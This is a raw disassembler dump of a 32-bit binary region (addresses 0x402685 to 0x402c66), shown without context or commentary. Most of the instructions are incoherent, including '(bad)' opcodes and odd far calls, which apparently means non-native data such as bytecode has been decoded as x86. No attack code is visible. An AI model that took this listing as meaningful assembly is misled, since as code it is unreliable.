  402685:	outs   dx,DWORD PTR ds:[esi]
  402686:	and    eax,0x2d0a0000
  40268b:	push   cs
  40268c:	push   es
  40268d:	jb     0x4026c8
  40268f:	add    BYTE PTR [eax],al
  402691:	jo     0x4026ae
  402693:	outs   dx,DWORD PTR ds:[esi]
  402694:	and    eax,0x2c0a0000
  402699:	pop    es
  40269a:	add    dl,BYTE PTR [edi]
  40269c:	sub    BYTE PTR [ebx],ch
  40269e:	add    BYTE PTR [eax],al
  4026a0:	push   es
  4026a1:	or     BYTE PTR [edi],dl
  4026a3:	pop    eax
  4026a4:	or     al,0x8
  4026a6:	pop    es
  4026a7:	mov    gs,WORD PTR [ecx+0x32]
  4026aa:	(bad)  
  4026ab:	sub    dl,BYTE PTR [ebx]
  4026ad:	xor    BYTE PTR ds:0x8c00,al
  4026b3:	add    BYTE PTR [eax],cl
  4026b5:	add    BYTE PTR [eax],al
  4026b7:	adc    DWORD PTR [ebx],eax
  4026b9:	outs   dx,DWORD PTR ds:[esi]
  4026ba:	aas    
  4026bb:	add    BYTE PTR [eax],al
  4026bd:	or     ch,BYTE PTR [esi+edx*1]
  4026c0:	add    edx,DWORD PTR [esi]
  4026c2:	outs   dx,DWORD PTR ds:[esi]
  4026c3:	inc    eax
  4026c4:	add    BYTE PTR [eax],al
  4026c6:	or     bl,BYTE PTR [edi]
  4026c8:	das    
  4026c9:	cs sbb al,0x3
  4026cc:	push   ss
  4026cd:	outs   dx,DWORD PTR ds:[esi]
  4026ce:	inc    eax
  4026cf:	add    BYTE PTR [eax],al
  4026d1:	or     bl,BYTE PTR [edi]
  4026d3:	sub    eax,0x2803112e
  4026d8:	xchg   ebp,eax
  4026d9:	add    BYTE PTR [eax],al
  4026db:	push   es
  4026dc:	and    BYTE PTR [ebp+0x1b],bl
  4026df:	add    BYTE PTR [eax],al
  4026e1:	jae    0x40268d
  4026e3:	add    BYTE PTR [eax],al
  4026e5:	push   es
  4026e6:	jp     0x4026eb
  4026e8:	pop    ds
  4026e9:	cmp    dl,BYTE PTR [edi]
  4026eb:	outs   dx,DWORD PTR ds:[esi]
  4026ec:	inc    ecx
  4026ed:	add    BYTE PTR [eax],al
  4026ef:	or     cl,BYTE PTR [edx]
  4026f1:	add    ebp,DWORD PTR [edi+0x3f]
  4026f4:	add    BYTE PTR [eax],al
  4026f6:	or     dl,BYTE PTR [edi]
  4026f8:	pop    ecx
  4026f9:	or     eax,DWORD PTR [esi]
  4026fb:	push   ss
  4026fc:	xor    al,BYTE PTR [esi]
  4026fe:	push   es
  4026ff:	pop    es
  402700:	inc    BYTE PTR [ecx]
  402702:	sub    eax,DWORD PTR [ecx]
  402704:	pop    ss
  402705:	or     al,0x8
  402707:	sub    al,0x23
  402709:	push   es
  40270a:	push   ss
  40270b:	das    
  40270c:	or     eax,DWORD PTR [ebx+eax*1]
  40270f:	pop    ss
  402710:	outs   dx,DWORD PTR ds:[esi]
  402711:	inc    edx
  402712:	add    BYTE PTR [eax],al
  402714:	or     dl,BYTE PTR [ecx+0x2b]
  402717:	or     al,0x4
  402719:	add    edx,DWORD PTR [edi]
  40271b:	push   es
  40271c:	pop    ss
  40271d:	pop    ecx
  40271e:	outs   dx,DWORD PTR ds:[esi]
  40271f:	inc    ebx
  402720:	add    BYTE PTR [eax],al
  402722:	or     dl,BYTE PTR [ecx+0x5]
  402725:	jle    0x40276b
  402727:	add    BYTE PTR [eax],al
  402729:	or     dl,BYTE PTR [ecx+0x2a]
  40272c:	add    al,0x3
  40272e:	pop    ss
  40272f:	push   es
  402730:	pop    ss
  402731:	pop    ecx
  402732:	outs   dx,DWORD PTR ds:[esi]
  402733:	inc    ebx
  402734:	add    BYTE PTR [eax],al
  402736:	or     dl,BYTE PTR [ecx+0x5]
  402739:	add    eax,DWORD PTR [esi]
  40273b:	pop    ss
  40273c:	pop    eax
  40273d:	outs   dx,DWORD PTR ds:[esi]
  40273e:	inc    edx
  40273f:	add    BYTE PTR [eax],al
  402741:	or     dl,BYTE PTR [ecx+0x2a]
  402744:	adc    esi,DWORD PTR [eax]
  402746:	add    eax,DWORD PTR [eax]
  402748:	repnz add BYTE PTR [eax],al
  40274b:	add    BYTE PTR [ecx],cl
  40274d:	add    BYTE PTR [eax],al
  40274f:	adc    DWORD PTR [eax],ebp
  402751:	inc    ebp
  402752:	add    BYTE PTR [eax],al
  402754:	or     dh,BYTE PTR [ebx+0x46]
  402757:	add    BYTE PTR [eax],al
  402759:	or     cl,BYTE PTR [edx]
  40275b:	add    ch,BYTE PTR [eax]
  40275d:	inc    edi
  40275e:	add    BYTE PTR [eax],al
  402760:	or     bl,BYTE PTR [edi]
  402762:	xor    al,0x6f
  402764:	dec    eax
  402765:	add    BYTE PTR [eax],al
  402767:	or     dl,BYTE PTR [ebx]
  402769:	pop    es
  40276a:	push   ss
  40276b:	adc    ecx,DWORD PTR [eax]
  40276d:	cmp    BYTE PTR [ebp+0x11000000],bh
  402773:	pop    es
  402774:	adc    DWORD PTR [eax],ecx
  402776:	call   0x0:0x2d0070b
  40277d:	add    ch,BYTE PTR [eax]
  40277f:	and    BYTE PTR [eax],al
  402781:	add    BYTE PTR [edx],cl
  402783:	pop    ss
  402784:	outs   dx,DWORD PTR ds:[esi]
  402785:	dec    ecx
  402786:	add    BYTE PTR [eax],al
  402788:	or     cl,BYTE PTR [eax+ecx*1]
  40278b:	mov    gs,WORD PTR [ecx+0x17]
  40278e:	inc    eax
  40278f:	xchg   esi,eax
  402790:	add    BYTE PTR [eax],al
  402792:	add    BYTE PTR [eax],cl
  402794:	push   ss
  402795:	call   0xd02:0x274
  40279c:	pop    es
  40279d:	or     DWORD PTR [edx],eax
  40279f:	sub    BYTE PTR ds:0x13060000,bl
  4027a5:	add    al,0x7
  4027a7:	outs   dx,DWORD PTR ds:[esi]
  4027a8:	push   ds
  4027a9:	add    BYTE PTR [eax],al
  4027ab:	or     ch,BYTE PTR [edi+0x1f]
  4027ae:	add    BYTE PTR [eax],al
  4027b0:	or     ch,BYTE PTR [ebx+ecx*2]
  4027b3:	pop    es
  4027b4:	rol    BYTE PTR [esi],1
  4027b6:	add    BYTE PTR [eax],al
  4027b8:	add    ch,BYTE PTR [eax]
  4027ba:	and    BYTE PTR [eax],al
  4027bc:	add    BYTE PTR [edx],cl
  4027be:	pop    ss
  4027bf:	outs   dx,DWORD PTR ds:[esi]
  4027c0:	dec    ecx
  4027c1:	add    BYTE PTR [eax],al
  4027c3:	or     dl,BYTE PTR [ebx]
  4027c5:	add    eax,0x9130511
  4027ca:	push   ss
  4027cb:	adc    ecx,DWORD PTR [edx]
  4027cd:	sub    esp,DWORD PTR [edi]
  4027cf:	adc    DWORD PTR [ecx],ecx
  4027d1:	adc    DWORD PTR [edx],ecx
  4027d3:	call   0x1302:0x674
  4027da:	push   es
  4027db:	adc    DWORD PTR [edi+ebp*2],eax
  4027de:	sbb    al,BYTE PTR [eax]
  4027e0:	add    BYTE PTR [esi],al
  4027e2:	adc    DWORD PTR [esi],eax
  4027e4:	outs   dx,DWORD PTR ds:[esi]
  4027e5:	aaa    
  4027e6:	add    BYTE PTR [eax],al
  4027e8:	push   es
  4027e9:	adc    DWORD PTR [esi],eax
  4027eb:	outs   dx,DWORD PTR ds:[esi]
  4027ec:	dec    edx
  4027ed:	add    BYTE PTR [eax],al
  4027ef:	or     dl,BYTE PTR [ecx]
  4027f1:	or     dl,BYTE PTR [edi]
  4027f3:	pop    eax
  4027f4:	adc    ecx,DWORD PTR [edx]
  4027f6:	adc    DWORD PTR [edx],ecx
  4027f8:	adc    DWORD PTR [ecx],ecx
  4027fa:	mov    gs,WORD PTR [ecx+0x32]
  4027fd:	rol    DWORD PTR [esi],1
  4027ff:	adc    DWORD PTR [edi+ebp*2],eax
  402802:	pop    ss
  402803:	add    BYTE PTR [eax],al
  402805:	push   es
  402806:	adc    DWORD PTR [edi+ebp*2],eax
  402809:	dec    ebx
  40280a:	add    BYTE PTR [eax],al
  40280c:	or     dl,BYTE PTR [ecx]
  40280e:	add    al,0x6f
  402810:	sbb    BYTE PTR [eax],al
  402812:	add    BYTE PTR [esi],al
  402814:	sub    BYTE PTR [eax],bl
  402816:	add    BYTE PTR [eax],al
  402818:	or     ch,BYTE PTR ds:0x6f09060e
  40281e:	push   es
  40281f:	add    BYTE PTR [eax],al
  402821:	push   es
  402822:	adc    DWORD PTR [edi+ebp*2],eax
  402825:	dec    ebx
  402826:	add    BYTE PTR [eax],al
  402828:	or     dl,BYTE PTR [ecx]
  40282a:	or     BYTE PTR [edi],dl
  40282c:	pop    eax
  40282d:	adc    ecx,DWORD PTR [eax]
  40282f:	adc    DWORD PTR [eax],ecx
  402831:	adc    DWORD PTR [edi],eax
  402833:	mov    gs,WORD PTR [ecx+0x3f]
  402836:	cmp    bh,bh
  402838:	(bad)  
  402839:	inc    DWORD PTR [edx]
  40283b:	push   es
  40283c:	jge    0x40284e
  40283e:	add    BYTE PTR [eax],al
  402840:	add    al,0x2a
  402842:	push   esi
  402843:	add    bh,BYTE PTR [ebx+0x10]
  402846:	add    BYTE PTR [eax],al
  402848:	add    al,0x2d
  40284a:	push   es
  40284b:	add    ch,BYTE PTR [eax]
  40284d:	add    BYTE PTR es:[eax],al
  402850:	push   es
  402851:	add    bh,BYTE PTR [ebx+0x10]
  402854:	add    BYTE PTR [eax],al
  402856:	add    al,0x2a
  402858:	push   ds
  402859:	add    bh,BYTE PTR [ebx+0x11]
  40285c:	add    BYTE PTR [eax],al
  40285e:	add    al,0x2a
  402860:	and    al,BYTE PTR [edx]
  402862:	add    edi,DWORD PTR [ebp+0x11]
  402865:	add    BYTE PTR [eax],al
  402867:	add    al,0x2a
  402869:	push   ds
  40286a:	add    bh,BYTE PTR [ebx+0x12]
  40286d:	add    BYTE PTR [eax],al
  40286f:	add    al,0x2a
  402871:	and    al,BYTE PTR [edx]
  402873:	add    edi,DWORD PTR [ebp+0x12]
  402876:	add    BYTE PTR [eax],al
  402878:	add    al,0x2a
  40287a:	add    BYTE PTR [eax],al
  40287c:	sbb    esi,DWORD PTR [eax]
  40287e:	add    al,0x0
  402880:	retf   0x1
  402883:	add    BYTE PTR [edx],cl
  402885:	add    BYTE PTR [eax],al
  402887:	adc    DWORD PTR [ebx+0x4c],esi
  40288a:	add    BYTE PTR [eax],al
  40288c:	or     cl,BYTE PTR [edx]
  40288e:	jae    0x4028dd
  402890:	add    BYTE PTR [eax],al
  402892:	or     cl,BYTE PTR [ebx]
  402894:	add    ch,BYTE PTR [eax]
  402896:	daa    
  402897:	add    BYTE PTR [eax],al
  402899:	push   es
  40289a:	outs   dx,DWORD PTR ds:[esi]
  40289b:	xor    DWORD PTR [eax],eax
  40289d:	add    BYTE PTR [edx],cl
  40289f:	outs   dx,DWORD PTR ds:[esi]
  4028a0:	xor    al,BYTE PTR [eax]
  4028a2:	add    BYTE PTR [edx],cl
  4028a4:	adc    ecx,DWORD PTR [eax+edi*1]
  4028a7:	xor    al,0x1
  4028a9:	add    BYTE PTR [eax],al
  4028ab:	adc    cl,BYTE PTR [eax+ebp*1]
  4028ae:	xor    eax,DWORD PTR [eax]
  4028b0:	add    BYTE PTR [edx],cl
  4028b2:	or     al,0x7
  4028b4:	or     BYTE PTR [edi+0x4e],ch
  4028b7:	add    BYTE PTR [eax],al
  4028b9:	or     bh,BYTE PTR [edx]
  4028bb:	and    BYTE PTR [ecx],al
  4028bd:	add    BYTE PTR [eax],al
  4028bf:	pop    es
  4028c0:	or     BYTE PTR [edi+0x4f],ch
  4028c3:	add    BYTE PTR [eax],al
  4028c5:	or     cl,BYTE PTR [eax]
  4028c7:	outs   dx,DWORD PTR ds:[esi]
  4028c8:	sbb    DWORD PTR [eax],eax
  4028ca:	add    BYTE PTR [esi],al
  4028cc:	sub    al,0x4c
  4028ce:	jb     0x402919
  4028d0:	add    BYTE PTR [eax],al
  4028d2:	jo     0x4028dc
  4028d4:	outs   dx,DWORD PTR ds:[esi]
  4028d5:	pop    ss
  4028d6:	add    BYTE PTR [eax],al
  4028d8:	push   es
  4028d9:	sub    BYTE PTR [eax+0x0],dl
  4028dc:	add    BYTE PTR [edx],cl
  4028de:	or     eax,0x1c6f08
  4028e3:	add    BYTE PTR [esi],al
  4028e5:	adc    eax,DWORD PTR [eax+ecx*1]
  4028e8:	outs   dx,DWORD PTR ds:[esi]
  4028e9:	sbb    BYTE PTR [eax],al
  4028eb:	add    BYTE PTR [esi],al
  4028ed:	sub    BYTE PTR [eax],bl
  4028ef:	add    BYTE PTR [eax],al
  4028f1:	or     ch,BYTE PTR ds:0x1c6f0813
  4028f7:	add    BYTE PTR [eax],al
  4028f9:	push   es
  4028fa:	or     BYTE PTR [edi+0x18],ch
  4028fd:	add    BYTE PTR [eax],al
  4028ff:	push   es
  402900:	sub    BYTE PTR [eax+0x13060000],al
  402906:	add    al,0x6
  402908:	or     DWORD PTR [ecx],edx
  40290a:	add    al,0x73
  40290c:	push   ecx
  40290d:	add    BYTE PTR [eax],al
  40290f:	or     ch,BYTE PTR [edi+0x52]
  402912:	add    BYTE PTR [eax],al
  402914:	or     bh,BYTE PTR [eax]
  402916:	lds    eax,FWORD PTR [eax]
  402918:	add    BYTE PTR [eax],al
  40291a:	or     BYTE PTR [edi+0x15],ch
  40291d:	add    BYTE PTR [eax],al
  40291f:	push   es
  402920:	outs   dx,DWORD PTR ds:[esi]
  402921:	pop    ds
  402922:	add    BYTE PTR [eax],al
  402924:	or     ch,BYTE PTR [esi+ebp*2]
  402927:	or     BYTE PTR [edi+0x1a],ch
  40292a:	add    BYTE PTR [eax],al
  40292c:	push   es
  40292d:	outs   dx,DWORD PTR ds:[esi]
  40292e:	push   ebx
  40292f:	add    BYTE PTR [eax],al
  402931:	or     dl,BYTE PTR [esi]
  402933:	xor    DWORD PTR [eax+0x8],esp
  402936:	outs   dx,DWORD PTR ds:[esi]
  402937:	sbb    al,BYTE PTR [eax]
  402939:	add    BYTE PTR [esi],al
  40293b:	outs   dx,DWORD PTR ds:[esi]
  40293c:	push   esp
  40293d:	add    BYTE PTR [eax],al
  40293f:	or     dl,BYTE PTR [ebx]
  402941:	or     eax,0xd113a2b
  402946:	outs   dx,DWORD PTR ds:[esi]
  402947:	push   ebp
  402948:	add    BYTE PTR [eax],al
  40294a:	or     dl,BYTE PTR [ebx]
  40294c:	add    eax,0x56280512
  402951:	add    BYTE PTR [eax],al
  402953:	or     dl,BYTE PTR [ebx]
  402955:	push   es
  402956:	or     BYTE PTR [edi+0x17],ch
  402959:	add    BYTE PTR [eax],al
  40295b:	push   es
  40295c:	adc    DWORD PTR [esi],eax
  40295e:	outs   dx,DWORD PTR ds:[esi]
  40295f:	cmp    BYTE PTR [eax],al
  402961:	add    BYTE PTR [esi],al
  402963:	sub    BYTE PTR [edi+0x0],bh
  402966:	add    BYTE PTR [esi],al
  402968:	adc    eax,DWORD PTR [edi]
  40296a:	push   es
  40296b:	adc    DWORD PTR [edi],eax
  40296d:	adc    DWORD PTR [esi],eax
  40296f:	outs   dx,DWORD PTR ds:[esi]
  402970:	cmp    DWORD PTR [eax],eax
  402972:	add    BYTE PTR [esi],al
  402974:	jae    0x4029c7
  402976:	add    BYTE PTR [eax],al
  402978:	or     ch,BYTE PTR [edi+0x52]
  40297b:	add    BYTE PTR [eax],al
  40297d:	or     dl,BYTE PTR [ecx]
  40297f:	or     eax,0x266f
  402984:	or     ch,BYTE PTR ds:0x1156debd
  40298a:	or     eax,0xd11072c
  40298f:	outs   dx,DWORD PTR ds:[esi]
  402990:	daa    
  402991:	add    BYTE PTR [eax],al
  402993:	or     bl,ah
  402995:	or     BYTE PTR [edi+0x17],ch
  402998:	add    BYTE PTR [eax],al
  40299a:	push   es
  40299b:	or     BYTE PTR [edi+0x1b],ch
  40299e:	add    BYTE PTR [eax],al
  4029a0:	push   es
  4029a1:	sub    BYTE PTR [esi+0x0],bh
  4029a4:	add    BYTE PTR [esi],al
  4029a6:	adc    ecx,DWORD PTR [eax]
  4029a8:	or     BYTE PTR [edi+0x1c],ch
  4029ab:	add    BYTE PTR [eax],al
  4029ad:	push   es
  4029ae:	adc    ecx,DWORD PTR [ecx]
  4029b0:	or     BYTE PTR [edi+0x18],ch
  4029b3:	add    BYTE PTR [eax],al
  4029b5:	push   es
  4029b6:	sub    BYTE PTR [eax],bl
  4029b8:	add    BYTE PTR [eax],al
  4029ba:	or     ch,BYTE PTR ds:0x1c6f0813
  4029c0:	add    BYTE PTR [eax],al
  4029c2:	push   es
  4029c3:	or     BYTE PTR [edi+0x18],ch
  4029c6:	add    BYTE PTR [eax],al
  4029c8:	push   es
  4029c9:	sub    BYTE PTR [eax+0x13060000],al
  4029cf:	or     DWORD PTR [esi],eax
  4029d1:	adc    DWORD PTR [eax],ecx
  4029d3:	adc    DWORD PTR [ecx],ecx
  4029d5:	jae    0x402a28
  4029d7:	add    BYTE PTR [eax],al
  4029d9:	or     ch,BYTE PTR [edi+0x52]
  4029dc:	add    BYTE PTR [eax],al
  4029de:	or     dl,BYTE PTR [edx]
  4029e0:	or     al,0x28
  4029e2:	add    BYTE PTR ss:[eax],al
  4029e5:	or     bh,BYTE PTR [edx]
  4029e7:	sar    dh,0xff
  4029ea:	(bad)  
  4029eb:	fimul  WORD PTR [esi]
  4029ed:	adc    cl,BYTE PTR [esi+edi*8]
  4029f0:	push   ss
  4029f1:	pop    es
  4029f2:	add    BYTE PTR [eax],al
  4029f4:	sbb    ebp,DWORD PTR [edi+0x27]
  4029f7:	add    BYTE PTR [eax],al
  4029f9:	or     bl,ah
  4029fb:	adc    eax,0x6f060a13
  402a00:	push   edi
  402a01:	add    BYTE PTR [eax],al
  402a03:	or     dl,BYTE PTR [ebx]
  402a05:	push   cs
  402a06:	sub    esp,DWORD PTR [edi]
  402a08:	adc    cl,BYTE PTR [esi]
  402a0a:	sub    BYTE PTR [eax+0x0],bl
  402a0d:	add    BYTE PTR [edx],cl
  402a0f:	adc    ecx,DWORD PTR [ebx]
  402a11:	adc    cl,BYTE PTR [ebx]
  402a13:	sub    BYTE PTR [ecx+0x0],bl
  402a16:	add    BYTE PTR [edx],cl
  402a18:	outs   dx,DWORD PTR ds:[esi]
  402a19:	aas    
  402a1a:	add    BYTE PTR [eax],al
  402a1c:	or     dl,BYTE PTR [ecx]
  402a1e:	or     dh,BYTE PTR [ecx]
  402a20:	push   cs
  402a21:	adc    cl,BYTE PTR [ebx]
  402a23:	sub    BYTE PTR [ecx+0x0],bl
  402a26:	add    BYTE PTR [edx],cl
  402a28:	outs   dx,DWORD PTR ds:[esi]
  402a29:	aas    
  402a2a:	add    BYTE PTR [eax],al
  402a2c:	or     dl,BYTE PTR [ebx]
  402a2e:	or     dl,BYTE PTR [edx]
  402a30:	push   cs
  402a31:	sub    BYTE PTR [edx+0x0],bl
  402a34:	add    BYTE PTR [edx],cl
  402a36:	sub    eax,0x120eded0
  402a3b:	push   cs
  402a3c:	(bad)  
  402a3d:	push   ss
  402a3e:	sldt   WORD PTR [eax]
  402a41:	sbb    ebp,DWORD PTR [edi+0x27]
  402a44:	add    BYTE PTR [eax],al
  402a46:	or     bl,ah
  402a48:	add    al,BYTE PTR [esi]
  402a4a:	adc    DWORD PTR [edx],ecx
  402a4c:	sub    BYTE PTR [esi],ch
  402a4e:	add    BYTE PTR [eax],al
  402a50:	push   es
  402a51:	sub    al,BYTE PTR [eax]
  402a53:	add    BYTE PTR [ecx+0x4c],al
  402a56:	add    BYTE PTR [eax],al
  402a58:	add    al,BYTE PTR [eax]
  402a5a:	add    BYTE PTR [eax],al
  402a5c:	mov    edx,0x47000000
  402a61:	add    BYTE PTR [eax],al
  402a63:	add    BYTE PTR [ecx],al
  402a65:	add    DWORD PTR [eax],eax
  402a67:	add    BYTE PTR [eax+eax*1],cl
  402a6a:	add    BYTE PTR [eax],al
  402a6c:	add    BYTE PTR [eax],al
  402a6e:	add    BYTE PTR [eax],al
  402a70:	add    al,BYTE PTR [eax]
  402a72:	add    BYTE PTR [eax],al
  402a74:	push   ds
  402a75:	add    BYTE PTR [eax],al
  402a77:	add    BYTE PTR [edi+0x1],al
  402a7a:	add    BYTE PTR [eax],al
  402a7c:	add    DWORD PTR gs:[eax],eax
  402a7f:	add    BYTE PTR [esi],cl
  402a81:	add    BYTE PTR [eax],al
  402a83:	add    BYTE PTR [eax],al
  402a85:	add    BYTE PTR [eax],al
  402a87:	add    BYTE PTR [edx],al
  402a89:	add    BYTE PTR [eax],al
  402a8b:	add    BYTE PTR [esi+0x1],bh
  402a8e:	add    BYTE PTR [eax],al
  402a90:	xor    al,0x0
  402a92:	add    BYTE PTR [eax],al
  402a94:	mov    dl,0x1
  402a96:	add    BYTE PTR [eax],al
  402a98:	push   cs
  402a99:	add    BYTE PTR [eax],al
  402a9b:	add    BYTE PTR [eax],al
  402a9d:	add    BYTE PTR [eax],al
  402a9f:	add    BYTE PTR [ebx],bl
  402aa1:	xor    BYTE PTR ds:0x10000,al
  402aa7:	add    BYTE PTR [ebx],cl
  402aa9:	add    BYTE PTR [eax],al
  402aab:	adc    DWORD PTR [ecx+ebx*1],eax
  402aae:	pop    eax
  402aaf:	or     ch,BYTE PTR [eax]
  402ab1:	xor    eax,DWORD PTR [eax]
  402ab3:	add    BYTE PTR [esi],al
  402ab5:	or     eax,DWORD PTR [edx]
  402ab7:	outs   dx,DWORD PTR ds:[esi]
  402ab8:	sub    eax,0xc060000
  402abd:	pop    es
  402abe:	or     BYTE PTR [eax],ch
  402ac0:	xor    BYTE PTR [eax],al
  402ac2:	add    BYTE PTR [esi],al
  402ac4:	add    ebp,DWORD PTR [edi+0x57]
  402ac7:	add    BYTE PTR [eax],al
  402ac9:	or     dl,BYTE PTR [ebx]
  402acb:	or     BYTE PTR [ebx],ch
  402acd:	pop    edi
  402ace:	adc    cl,BYTE PTR [eax]
  402ad0:	sub    BYTE PTR [eax+0x0],bl
  402ad3:	add    BYTE PTR [edx],cl
  402ad5:	or     eax,0x28031206
  402ada:	pop    ecx
  402adb:	add    BYTE PTR [eax],al
  402add:	or     ch,BYTE PTR [edi+0x3f]
  402ae0:	add    BYTE PTR [eax],al
  402ae2:	or     bl,BYTE PTR [ecx+0x13]
  402ae5:	add    al,0x12
  402ae7:	add    ebp,DWORD PTR [eax]
  402ae9:	pop    ecx
  402aea:	add    BYTE PTR [eax],al
  402aec:	or     ch,BYTE PTR [eax]
  402aee:	pop    ebx
  402aef:	add    BYTE PTR [eax],al
  402af1:	or     al,BYTE PTR [esi]
  402af3:	pop    ds
  402af4:	or     bl,BYTE PTR [eax+0x7]
  402af7:	xor    DWORD PTR [edi+ebx*1],ebx
  402afa:	and    BYTE PTR [ecx],dl
  402afc:	add    al,0x73
  402afe:	pop    esp
  402aff:	add    BYTE PTR [eax],al
  402b01:	or     ch,BYTE PTR [eax]
  402b03:	pop    ebx
  402b04:	add    BYTE PTR [eax],al
  402b06:	or     dl,BYTE PTR [edx]
  402b08:	add    ebp,DWORD PTR [eax]
  402b0a:	pop    ebp
  402b0b:	add    BYTE PTR [eax],al
  402b0d:	or     ch,BYTE PTR [eax]
  402b0f:	pop    esi
  402b10:	add    BYTE PTR [eax],al
  402b12:	or     ch,BYTE PTR [ebx]
  402b14:	sbb    BYTE PTR [edi],al
  402b16:	push   es
  402b17:	pop    ecx
  402b18:	adc    eax,DWORD PTR ds:0x11060411
  402b1e:	add    eax,0x3120511
  402b23:	sub    BYTE PTR [ebp+0x0],bl
  402b26:	add    BYTE PTR [edx],cl
  402b28:	sub    BYTE PTR [edi],ch
  402b2a:	add    BYTE PTR [eax],al
  402b2c:	push   es
  402b2d:	adc    cl,BYTE PTR [eax]
  402b2f:	sub    BYTE PTR [edx+0x0],bl
  402b32:	add    BYTE PTR [edx],cl
  402b34:	sub    eax,0x120ede98
  402b39:	or     dh,bh
  402b3b:	push   ss
  402b3c:	sldt   WORD PTR [eax]
  402b3f:	sbb    ebp,DWORD PTR [edi+0x27]
  402b42:	add    BYTE PTR [eax],al
  402b44:	or     bl,ah
  402b46:	add    ch,BYTE PTR [edi+0x24]
  402b49:	add    BYTE PTR [eax],al
  402b4b:	push   es
  402b4c:	adc    eax,DWORD PTR [esi]
  402b4e:	adc    DWORD PTR [esi],eax
  402b50:	mov    gs,WORD PTR [ecx+0x2c]
  402b53:	push   edi
  402b54:	sub    BYTE PTR [edi+0x0],bl
  402b57:	add    BYTE PTR [edx],cl
  402b59:	pop    es
  402b5a:	sub    BYTE PTR [ebp+0x28060000],cl
  402b60:	xor    BYTE PTR [eax],al
  402b62:	add    BYTE PTR [esi],al
  402b64:	adc    DWORD PTR [esi],eax
  402b66:	adc    ecx,DWORD PTR [ecx]
  402b68:	push   ss
  402b69:	adc    ecx,DWORD PTR [edx]
  402b6b:	sub    esi,DWORD PTR [esi]
  402b6d:	adc    DWORD PTR [ecx],ecx
  402b6f:	adc    DWORD PTR [edx],ecx
  402b71:	call   0x707:0x16160713
  402b78:	adc    DWORD PTR [edi],eax
  402b7a:	outs   dx,DWORD PTR ds:[esi]
  402b7b:	inc    esi
  402b7c:	add    BYTE PTR [eax],al
  402b7e:	push   es
  402b7f:	sub    BYTE PTR [edi],ch
  402b81:	add    BYTE PTR [eax],al
  402b83:	push   es
  402b84:	sbb    BYTE PTR [edx],bl
  402b86:	pop    es
  402b87:	sbb    BYTE PTR [ecx+0x7],bl
  402b8a:	sbb    bl,BYTE PTR [ecx+0x11]
  402b8d:	pop    es
  402b8e:	outs   dx,DWORD PTR ds:[esi]
  402b8f:	inc    edi
  402b90:	add    BYTE PTR [eax],al
  402b92:	push   es
  402b93:	sub    BYTE PTR [edi],ch
  402b95:	add    BYTE PTR [eax],al
  402b97:	push   es
  402b98:	sub    BYTE PTR [edi+0x0],bl
  402b9b:	add    BYTE PTR [edx],cl
  402b9d:	adc    DWORD PTR [edx],ecx
  402b9f:	pop    ss
  402ba0:	pop    eax
  402ba1:	adc    ecx,DWORD PTR [edx]
  402ba3:	adc    DWORD PTR [edx],ecx
  402ba5:	adc    DWORD PTR [ecx],ecx
  402ba7:	mov    gs,WORD PTR [ecx+0x32]
  402baa:	ret    0x12a
  402bad:	adc    BYTE PTR [eax],al
  402baf:	add    BYTE PTR [edx],al
  402bb1:	add    BYTE PTR [eax],ah
  402bb3:	add    BYTE PTR [esp+ecx*4+0x0],ch
  402bb7:	push   cs
  402bb8:	add    BYTE PTR [eax],al
  402bba:	add    BYTE PTR [eax],al
  402bbc:	adc    esi,DWORD PTR [eax]
  402bbe:	add    eax,DWORD PTR [eax]
  402bc0:	jae    0x402bc2
  402bc2:	add    BYTE PTR [eax],al
  402bc4:	or     eax,0x2110000
  402bc9:	or     al,BYTE PTR [ebx+ecx*1]
  402bcc:	push   cs
  402bcd:	add    al,0x7
  402bcf:	jae    0x402c0b
  402bd1:	add    BYTE PTR [eax],al
  402bd3:	push   es
  402bd4:	or     al,0x8
  402bd6:	outs   dx,DWORD PTR ds:[esi]
  402bd7:	cmp    al,0x0
  402bd9:	add    BYTE PTR [esi],al
  402bdb:	sub    eax,0x6201f19
  402be0:	jae    0x402c3e
  402be2:	add    BYTE PTR [eax],al
  402be4:	or     ch,BYTE PTR [eax]
  402be6:	pop    ebx
  402be7:	add    BYTE PTR [eax],al
  402be9:	or     cl,BYTE PTR [eax]
  402beb:	outs   dx,DWORD PTR ds:[esi]
  402bec:	cmp    eax,0x28060000
  402bf1:	pop    esi
  402bf2:	add    BYTE PTR [eax],al
  402bf4:	or     ch,BYTE PTR [edx]
  402bf6:	push   ss
  402bf7:	or     eax,0x201f372b
  402bfc:	push   es
  402bfd:	jae    0x402c5b
  402bff:	add    BYTE PTR [eax],al
  402c01:	or     ch,BYTE PTR [eax]
  402c03:	pop    ebx
  402c04:	add    BYTE PTR [eax],al
  402c06:	or     cl,BYTE PTR [eax]
  402c08:	or     DWORD PTR [edi+0x3f],ebp
  402c0b:	add    BYTE PTR [eax],al
  402c0d:	push   es
  402c0e:	adc    eax,DWORD PTR [ecx+edx*1]
  402c11:	add    al,0x28
  402c13:	pop    ebx
  402c14:	add    BYTE PTR [eax],al
  402c16:	or     dl,BYTE PTR [ecx]
  402c18:	add    al,0x6f
  402c1a:	aas    
  402c1b:	add    BYTE PTR [eax],al
  402c1d:	or     al,BYTE PTR [edi]
  402c1f:	cs add eax,0x5f28
  402c25:	or     cl,BYTE PTR [ecx]
  402c27:	sub    eax,0x50a0304
  402c2c:	or     ecx,DWORD PTR [ecx]
  402c2e:	pop    ss
  402c2f:	pop    eax
  402c30:	or     eax,0x3e6f0809
  402c35:	add    BYTE PTR [eax],al
  402c37:	push   es
  402c38:	xor    al,al
  402c3a:	sub    al,BYTE PTR [eax]
  402c3c:	adc    esi,DWORD PTR [eax]
  402c3e:	add    eax,DWORD PTR [eax]
  402c40:	das    
  402c41:	add    BYTE PTR [eax],al
  402c43:	add    BYTE PTR [esi],cl
  402c45:	add    BYTE PTR [eax],al
  402c47:	adc    DWORD PTR [ebx],eax
  402c49:	outs   dx,DWORD PTR ds:[esi]
  402c4a:	aas    
  402c4b:	add    BYTE PTR [eax],al
  402c4d:	or     al,BYTE PTR [edx]
  402c4f:	xor    DWORD PTR [edi],eax
  402c51:	add    ebp,DWORD PTR [eax]
  402c53:	pop    esi
  402c54:	add    BYTE PTR [eax],al
  402c56:	or     ch,BYTE PTR [edx]
  402c58:	add    al,BYTE PTR [ebx]
  402c5a:	outs   dx,DWORD PTR ds:[esi]
  402c5b:	aas    
  402c5c:	add    BYTE PTR [eax],al
  402c5e:	or     bl,BYTE PTR [ecx+0x18]
  402c61:	pop    ebx
  402c62:	or     bl,BYTE PTR [edi]
  402c64:	and    BYTE PTR [esi],al
  402c66:	jae    0x402cc4
